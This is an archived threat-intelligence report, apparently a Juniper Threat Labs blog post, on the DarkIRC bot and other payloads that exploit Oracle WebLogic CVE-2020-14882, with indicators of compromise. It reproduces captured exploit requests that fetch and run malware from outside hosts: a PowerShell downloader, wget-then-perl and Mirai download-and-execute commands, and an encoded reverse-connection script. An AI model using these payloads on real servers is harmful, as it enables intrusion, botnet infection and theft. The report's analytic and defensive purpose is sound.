{
    "id": "d7d0fee5-8d35-4165-b031-6715377c3465",
    "created_at": "2023-01-12T15:04:12.45928Z",
    "updated_at": "2025-03-27T02:09:18.837018Z",
    "deleted_at": null,
    "sha1_hash": "ebc2c2e10e0ecb70f17a4abf084df8856569007d",
    "title": "2020-12-01 - DarkIRC bot exploits recent Oracle WebLogic vulnerability",
    "authors": "",
    "file_creation_date": "2022-05-28T03:54:56Z",
    "file_modification_date": "2022-05-28T03:54:56Z",
    "file_size": 1126038,
    "plain_text": "# DarkIRC bot exploits recent Oracle WebLogic vulnerability\n\n**blogs.juniper.net/en-us/threat-research/darkirc-bot-exploits-oracle-weblogic-vulnerability**\n\nDecember 1, 2020\n\nJuniper Threat Labs is seeing active attacks on Oracle WebLogic software using CVE-2020-14882. This vulnerability, if successfully exploited,\nallows unauthenticated remote code execution. As of this writing, we found 3,109 open Oracle WebLogic servers using Shodan. We are seeing\nat least five different variants of attacks/payload. For the purpose of this blog, we will focus on one particular payload that installs a bot called\nDarkIRC. This bot performs a unique command and control domain generation algorithm that relies on the sent value of a particular crypto\nwallet. This bot is currently being sold on hack forums for $75USD.\n\nOpen Oracle Weblogic servers on the internet\n\n## DarkIRC\n\nDarkIRC version\n\nThe attack issues an HTTP GET request to a vulnerable WebLogic server, which will execute a powershell script to download and execute a\nbinary file hosted in cnc[ ]c25e6559668942[ ]xyz\n\n\n-----\n\n```\n GET /console/images/%252E%252E%252Fconsole.portal?\n _nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession\n (%22java.lang.Runtime.getRuntime().exec('powershell%20-NoP%20-NonI%20-W%20Hidden%20-Exec%20Bypass%20%22\n (New Object%20System.Net.WebClient).DownloadFile(%22http://cnc.c25e655{redacted}xyz/svchost.exe%22,%22$env:temp%0Degsvc.exe%22);\n %20Start-Process%20%22$env:temp%0Degsvc.exe%22%22');%22); HTTP/1.1\n Host: {redacted}:7001\n Connection: keep-alive\n Accept-Encoding: gzip, deflate\n Accept: */*\n User-Agent: python-requests/2.24.0\n\n```\nThe source IP is 83.97.20.90. This IP resolves to the C&C of this bot which means the attacker IP is the same as the C&C. The sha256 hash\nof the payload is d78c90684abcd21b26bccf4b6258494a894d9b8d967a79639f0815a17e1e59a5. This payload is a .NET file with a file size of\n6MB, fairly encrypted and has the following properties:\n\nBasic structure of the crypter\n\n## The Crypter\n\nThe crypter or the packer is being used primarily to conceal its true intention and avoid detection. It also includes anti-analysis and antisandbox functions. It tries to detect if it is running under the following virtualized environments to determine if it should not continue its\nmalicious routine:\n\nVMware\nVirtualBox\nVBox\nQEMU\nXen\n\nIf it is not, it will load an encrypted file in its resource.\n\nDarkIRC Crypter virtual environment check\n\nAfter unpacking, we can clearly see what this malware wants to do, based on the name of its functions.\n\n\n-----\n\nFunctions inside DarkIRC when unpacked\n\n## Bot Functions\n\nThe bot installs itself in the %APPDATA%\\Chrome\\Chrome.exe and creates an autorun entry. Among its functions include:\n\nBrowser Stealer\nKeylogging\nBitcoin Clipper\nDDoS\n\nSlowloris\nRUDY (R-U-DeadYet?)\nTCP Flood\nHTTP Flood\nUDP Flood\nSyn Flood\nWorm or spread itself in the network\nDownload Files\nExecute Commands\n\n**Bitcoin Clipper**\n\nThis function allows the malware to change the copied bitcoin wallet address to the malware operator’s bitcoin wallet address. This essentially\nallows it to steal bitcoin transactions on the infected system. This is similar to what [Masad Stealer does.](https://blogs.juniper.net/en-us/threat-research/masad-stealer-exfiltrating-using-telegram)\n\n\n-----\n\nclipping routine\nBitcoin address by the malware operator:\n\n**3QRwJwLRFDBoeLZ2cToGUsdBGB3eqj3exH**\n\nIt connects to its Command and Control via IRC with an added encryption XOR encryption.\n\nis encrypted via XOR\nBelow are the bot commands:\n\n**Command** **Action**\n\n_steal_ _Steal browser passwords_\n\n_mssql_ _Spread via mssql (brute force)_\n\n_stopall_ _Stop all flood attacks_\n\n_rudy_ _Start or stop rudy flood attacks. If command includes stop, it means stop rudy attacks._\n\n_rdp_ _Spread via RDP (brute force)_\n\n_update_ _Update this bot_\n\n_upload_ _Upload files_\n\n_dlexerem_ _Download, execute and remove_\n\n_udp_ _Start/Stop udp flood attacks_\n\n_version_ _Get version info of the infected system_\n\n_dlexe_ _Download and execute_\n\n_username_ _Get username of the infected system_\n\n\nDarkIRC\n\nCnC communication\n\n\n-----\n\n_cd_ _Set current directory_\n\n_getip_ _Get IP address of the infected system_\n\n_md5_ _Get config md5 of bot_\n\n_usbspread_ _Spread via USB_\n\n_tcp_ _Start/Stop tcp flood attack_\n\n_discord_ _Steal discord token_\n\n_botversion_ _Get bot version_\n\n_syn_ _Syn flood_\n\n_http_ _Http flood_\n\n_slowloris_ _Slowloris DDoS attack_\n\n_uninstall_ _Uninstall itself_\n\n_smb_ _Spread via SMB_\n\n_cmd_ _Run command_\n\n## Command and Control DGA\n\nOne of its interesting functions is to generate a domain, based on the value of a particular dogecoin wallet,\nDHeMmdtVhMYQxjbhe2yKvm8nbjSx1At6cZ\n\nIt hashes the sent value of the wallet and gets the first 14 characters of the hash to complete the cnc domain below:\n\ncnc .<generated hash[:14].xyz>\nAt its current value, the resulting domain will be:\n\ncnc[dot]c25e6559668942.xyz\n\nDarkIRC uses a DGA that depends on the sent value of a\n\nparticular dogecoin wallet\nThe URL request returns a json formatted string, which includes the amount “sent” from that wallet.\n\nCurrent sent value of the\n\nwallet that the DGA relies on.\nIn the event that the existing domain is taken down, the malware operator could make a transaction that will change the “sent” value from the\nwallet, which will generate a new cnc domain for all the bots.\n\n## Who is behind this?\n\nWe found an account in Hack Forums by the name of “Freak_OG” that advertised this botnet back in August 2020 for $75USD.\n\n\n-----\n\nThreat actor advertising on hack forums.\nOn November 1, the same account posted a FUD (Fully Undetected) Crypter, selling it for $25USD. The filename of the file he is showing in\nthis post resembles the “Application Name” of our payload, WindowsFormsApp2.exe.\n\nThreat actor advertising it’s\n\ncrypter\nWe are not certain if the bot operator who attacked our honeypot is the same person who is advertising this malware in Hack Forums or one of\nhis/her customers.\n\n## Conclusion\n\nThreat actors will always be on the hunt for victims. One of the fastest ways for them to be victimized is to use a zero day exploit and attack the\ninternet, usually via a spray-and-pray technique.\n\nThis vulnerability was fixed by Oracle in October and a subsequent out of cycle patch was also released in November to fix a hole in the\nprevious patch. We recommend affected systems to patch immediately.\n\n## Oracle WebLogic RCE attacks\n\nBelow is brief information about the different attacks we have seen from our sensors and the payloads they try to install.\n\n## Attack Variant 1: Cobalt Strike Payload\n\n**Attacker IP**\n\n45.77.178.169\n\n**Attack Port**\n\n7001\n\n**IOC**\n\n139[.]180.194.87\n\n\n-----\n\n```\n GET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThre\n (weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20jav\n ld%20\n =%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);\n weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22get\n obj);\n %20String%20cmd%20=%20req.getHeader(%22cmd%22);String%5B%5D%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22w\n %20new%20String%5B%5D%7B%22\n cmd.exe%22,%20%22/c%22,%20cmd%7D%20:%20new%20String%5B%5D%7B%22/bin/sh%22,%20%22 c%22,%20cmd%7D;if(cmd%20!=%20null%20)%7B%20String%20result%20=%20new%20java.util.Scanner\n (new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22%5C%5CA%22).next();%20weblogic.servlet.internal.Servle\n (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().wr\n (new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();%7D%20currentThread.interrupt();') HTTP/1.0\n User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0\n Accept-Encoding: gzip, deflate\n Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n Connection: keep-alive\n cmd: powershell -ENC DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbgAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4Ad\n\n```\nThe powershell script executes a shellcode, which downloads from http://139[.]180.194.87:2233/LkQT. The URL did not return anything during\nour test. Based on threat intelligence, this IP is related to Cobalt Strike.\n\nShellcode\n\ndownloading Cobalt Strike\n\n## Attack Variant 2: Perlbot Payload\n\n**Attacker IP**\n\n85.248.227.163\n\n**Attack Port**\n\n7001\n\n**Payload Hash**\n\nef7df0f86ed1a1bca365d7247d60384ece4687db28e5ec9aee1a61b1cfa4befa\n```\n POST /console/css/%252e%252e%252fconsole.portal HTTP/1.0\n User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0\n Kapiko/3.0\n Accept-Encoding: gzip, deflate\n Accept: */*\n Connection: keep-alive\n Content-Type: application/x-www-form-urlencoded\n cmd: unset HISTFILE;unset HISTSAVE;wget http://159.69.66.124/bo;perl bo;rm -rf bo\n Content-Length: 1216\n _nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession\n ('weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();\n weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect...{redacted}\n\n## Attack 3: Meterpreter Payload\n\n```\n**Attacker IP**\n\n\n-----\n\n85 65 3 8\n\n**Attack Port**\n\n7001\n\n**Payload Hash**\n\n4bafb11609f744948f7adbba60b8f122906d6cb079b1a1f3b9ba82f362e03889\n```\n POST /console/css/.%252e/console.portal HTTP/1.1\n Host: {redacted}:7001\n User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\n Content-Type: application/x-www-form-urlencoded\n Content-Length: 2304\n handle=com.tangosol.coherence.mvel2.sh.ShellSession%28%27java.lang.Runtime.getRuntime%28%29.exec%28new%\n 20\n java.lang.String%28java.util.Base64.getDecoder%28%29.decode%28%22cG93ZXJzaGVsbCAtdyBoaWRkZW4gLW5vcCAtYy\n AkYT\n 0nMTg1LjY1LjEzNC4xNzgnOyRiPTg3Nzc7JGM9TmV3LU9iamVjdCBzeXN0ZW0ubmV0LnNvY2tldHMudGNwY2xpZW50OyRuYj1OZXctT\n 2JqZW\n N0IFN5c3RlbS5CeXRlW10gJGMuUmVjZWl2ZUJ1ZmZlcl{redacted}\n\n## Attack 4: Mirai Payload\n\n```\n**Attacker IP**\n\n83.97.20.90\n\n**Attack Port**\n\n7001\n\n**Payload Hash**\n\n81d51082566d3cebbc8d0d3df201a342f8056efbfb95a7778b6f5d56a264fb07\n```\n GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&\n handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec\n ('wget%20http://83[dot]97.20.90/mirai.x86%20 O%20/tmp/kpin;chmod%20777%20/tmp/kpin;/tmp/kpin');\n %22); HTTP/1.1\n Host: {redacted}:7001\n Connection: keep-alive\n Accept-Encoding: gzip, deflate\n Accept: */*\n User-Agent: python-requests/2.24.0\n Content-type: application/x-www-form-urlencoded; charset=utf-8\n\n```\nThe exploit is detected by IDP as “HTTP:ORACLE:WLOGIC-UNAUTH-RCE”.\n\nJuniper Advanced Threat Prevention (ATP) detects this file.\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-12-01 - DarkIRC bot exploits recent Oracle WebLogic vulnerability.pdf"
    ],
    "report_names": [
        "2020-12-01 - DarkIRC bot exploits recent Oracle WebLogic vulnerability.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535852,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653710096,
    "ts_modification_date": 1653710096,
    "files": {
        "pdf": "https://archive.orkl.eu/ebc2c2e10e0ecb70f17a4abf084df8856569007d.pdf",
        "text": "https://archive.orkl.eu/ebc2c2e10e0ecb70f17a4abf084df8856569007d.txt",
        "img": "https://archive.orkl.eu/ebc2c2e10e0ecb70f17a4abf084df8856569007d.jpg"
    }
}